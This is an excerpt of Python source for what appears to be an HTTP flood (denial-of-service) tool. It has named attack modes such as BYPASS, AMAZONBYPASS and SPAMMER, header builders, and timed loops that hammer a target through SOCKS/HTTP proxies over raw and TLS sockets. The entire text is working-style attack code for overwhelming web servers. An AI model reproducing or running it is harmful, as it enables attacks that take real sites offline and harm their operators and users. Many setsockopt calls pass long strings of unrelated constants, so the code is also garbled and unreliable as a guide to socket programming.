...
l7 = ["CFB","GET", "POST","HTTPRAW","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","MIX","MIXV2","BYPASS","BYPASSV2","AMAZONBYPASS","AMAZONBYPASSV2","CFBV2"]
...
def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method == "httpraw"  or method == "httpfast" or method == "httpfastv2" or method == "mix" or method == "mixv2" or method == "bypass" or method == "bypassv2" or method == "amazonbypass" or method == "amazonbypassv2" or method == "cfbv2":
    ...
    elif method == "post" or method == "spammer":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
...
def httpfast(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.IPPROTO_TCP,socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
...
def httpfastv2(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_FASTOPEN,socket.IPPROTO_TCP,socket.TCP_DEFER_ACCEPT,  1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
...
def mix(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.IPPROTO_TCP,socket.TCP_FASTOPEN,socket.AF_INET, socket.SOCK_STREAM,socket.IPPROTO_TCP,socket.TCP_CORK,socket.IPPROTO_TCP,socket.TCP_QUICKACK, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
...
def mixv2(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,socket.TCP_CORK,socket.TCP_DEFER_ACCEPT,socket.TCP_FASTOPEN,socket.TCP_LINGER2,socket.TCP_SYNCNT,socket.TCP_MAXSEG,socket.TCP_KEEPINTVL,socket.TCP_INFO,socket.TCP_WINDOW_CLAMP,socket.TCP_QUICKACK,socket.TCP_INFO, 1)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
...
def spammer(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.IPPROTO_TCP,socket.TCP_QUICKACK,socket.AF_INET, socket.SOCK_STREAM,socket.AF_AX25,socket.AF_ATMPVC, 1)
            s.setsockopt(socket.IPPROTO_UDP,socket.SOL_UDP, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
...
def httpraw(event, socks_type):
    header = Headers("httpraw")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.IPPROTO_RAW,socket.AF_INET, socket.SOCK_RAW, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
...
def getv2(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.IPPROTO_RAW,socket.SOCK_RAW,socket.AF_INET, socket.SOCK_STREAM,socket.IPPROTO_TCP,socket.TCP_DEFER_ACCEPT, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
